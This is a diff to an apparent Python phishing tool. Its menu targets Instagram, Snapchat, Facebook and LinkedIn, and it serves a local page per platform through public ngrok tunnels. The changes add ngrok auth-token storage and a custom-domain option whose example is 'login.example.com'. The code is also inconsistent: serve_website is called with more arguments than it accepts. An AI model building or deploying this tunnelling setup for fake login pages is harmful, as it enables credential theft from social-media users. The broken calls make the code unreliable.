@@ -16,15 +16,81 @@ import threading
 # Initialize colorama for Windows
 colorama.init()
 
-def generate_link(platform):
-    print("\nChoose link generation method:")
-    print("[1] Ngrok")
+def load_auth_token():
+    token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok_token.txt')
+    try:
+        with open(token_file, 'r') as f:
+            return f.read().strip()
+    except:
+        return None
+
+def save_auth_token(token):
+    token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok_token.txt')
+    with open(token_file, 'w') as f:
+        f.write(token)
+
+def setup_ngrok_auth():
+    # First try to load existing token
+    token = load_auth_token()
+    
+    if token:
+        try:
+            # Try to use existing token
+            result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
+                                 capture_output=True, text=True)
+            if result.returncode == 0:
+                try:
+                    # Verify token works by checking API
+                    requests.get("http://localhost:4040/api/tunnels")
+                    print("✓ Using saved auth token")
+                    return True
+                except:
+                    print("× Saved auth token is not working")
+            else:
+                print("× Saved auth token is invalid")
+        except Exception as e:
+            print(f"× Error with saved token: {str(e)}")
+    
+    # If we get here, we need a new token
+    print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
+    print("Options:")
+    print("[1] Enter new auth token")
+    print("[2] Create new ngrok account")
+    
     choice = input("Enter your choice: ").strip()
     
-    if choice != '1':
+    if choice == '1':
+        token = input("Enter your ngrok auth token: ").strip()
+        if token:
+            try:
+                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
+                                     capture_output=True, text=True)
+                if result.returncode == 0:
+                    print("✓ Auth token configured successfully")
+                    save_auth_token(token)  # Save the working token
+                    return True
+                else:
+                    print(f"× Error configuring auth token: {result.stderr}")
+                    return False
+            except Exception as e:
+                print(f"× Error configuring auth token: {str(e)}")
+                return False
+        else:
+            print("× No token provided")
+            return False
+    elif choice == '2':
+        print("\nPlease follow these steps:")
+        print("1. Go to https://ngrok.com")
+        print("2. Click 'Sign up'")
+        print("3. Create a new account")
+        print("4. Get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
+        input("\nPress Enter when you have your new auth token...")
+        return setup_ngrok_auth()  # Recursively call to handle the new token
+    else:
         print("Invalid choice!")
-        return None
-        
+        return False
+
+def generate_ngrok(platform):
     # Check and install ngrok if needed
     print("\nChecking ngrok installation...")
     try:
@@ -42,29 +108,25 @@ def generate_link(platform):
             print(f"× Error installing ngrok: {str(e)}")
             return None
             
-    # Setup ngrok authentication
-    try:
-        requests.get("http://localhost:4040/api/tunnels")
-    except:
-        print("\nNgrok auth token not configured")
-        print("Please get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
-        token = input("Enter your ngrok auth token: ").strip()
-        
-        if token:
-            try:
-                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
-                                     capture_output=True, text=True)
-                if result.returncode != 0:
-                    print(f"× Error configuring auth token: {result.stderr}")
-                    return None
-            except Exception as e:
-                print(f"× Error configuring auth token: {str(e)}")
-                return None
-        else:
-            print("× No token provided")
-            return None
+    # Setup ngrok configuration
+    print("\nNgrok Configuration:")
+    print("[1] Use auth token")
+    print("[2] Use custom domain")
+    config_choice = input("Enter your choice: ").strip()
     
-    return serve_website(platform)
+    if config_choice == '1':
+        if not setup_ngrok_auth():
+            return None
+        return serve_website(platform, 'ngrok')
+    elif config_choice == '2':
+        domain = input("\nEnter your custom domain (e.g., login.example.com): ").strip()
+        if not domain:
+            print("× No domain provided")
+            return None
+        return serve_website(platform, 'ngrok', domain)
+    else:
+        print("Invalid choice!")
+        return None
 
 def serve_website(platform):
     # Get the absolute path to the web directory
@@ -293,13 +355,13 @@ def main():
     while True:
         choice = print_menu()
         if choice == '1':
-            generate_link('instagram')
+            generate_ngrok('instagram')
         elif choice == '2':
-            generate_link('snapchat')
+            generate_ngrok('snapchat')
         elif choice == '3':
-            generate_link('facebook')
+            generate_ngrok('facebook')
         elif choice == '4':
-            generate_link('linkedin')
+            generate_ngrok('linkedin')
         elif choice == '5':
             print("\nExiting...")
             # Kill any running ngrok process
